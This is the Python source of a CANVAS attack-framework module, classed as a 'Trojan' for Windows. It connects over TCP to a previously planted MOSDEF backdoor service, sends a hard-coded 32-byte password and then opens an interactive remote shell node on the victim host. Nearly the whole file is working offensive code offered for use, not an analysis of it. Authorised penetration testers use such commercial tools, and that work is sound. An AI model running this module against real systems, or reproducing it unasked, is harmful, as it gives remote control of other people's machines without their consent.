#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit

# GUI info
NAME                = "Connect To Service"
DESCRIPTION         = "Connects to remote MOSDEF service via TCP"

DOCUMENTATION                   = {}
DOCUMENTATION["Repeatability"]  = ""
DOCUMENTATION["Notes"]          = """
Obviously if the firewall is on and if no firewall rule has been added,
the module won't work.
"""
VERSION                         = "0.1"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Trojans"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Windows", "i386"] ]
PROPERTY['VERSION']             = ['2000', 'XP', '2003','2008']

# VERSION LIST (Server: )

TARGETS = {
    0 : "Windows"
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version    = 0
        self.host       = ""
        self.port       = 5555
        self.name       = NAME
        self.password   = "A"*16+"B"*16
        return

    def test(self):
        """ check if service port exists """
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        s = self.connectTo(self.host,self.port)
        if not s:
            self.log("Failed to connect")
            return 0
        s.close()
        return 1

    def getargs(self):
        self.host       = self.target.interface
        self.port       = int(self.argsDict.get("port", self.port))
        self.password   = self.argsDict.get("password", self.password)
        self.password   = self.password[:32]
        self.password   = stroverwrite("\x00" * 32, self.password, 0)
        return

    def run(self):
        self.getargs()

        if not self.test():
            return 0

        self.log("Using password: %s" % prettyprint(self.password))

        vername = TARGETS[self.version]

        self.setInfo("%s running against %s"%(NAME,vername))
        s = self.connectTo()
        if not s:
            self.log("No connection...failed")
            return 0

        s.sendall(self.password)

        if "WINDOWS" in vername.upper():
            import win32MosdefShellServer
            from win32Node import win32Node
            node            = win32Node()
            node.parentnode = self.argsDict["passednodes"][0]
            win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
            node.startup()
            return node
        else:
            self.log("No version known for %s"%vername)

        return 0

    def displayVersions(self):
        i = 0
        for listline in TARGETS.values():
            print "%d : %s"% (i, listline[0])
            i += 1

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
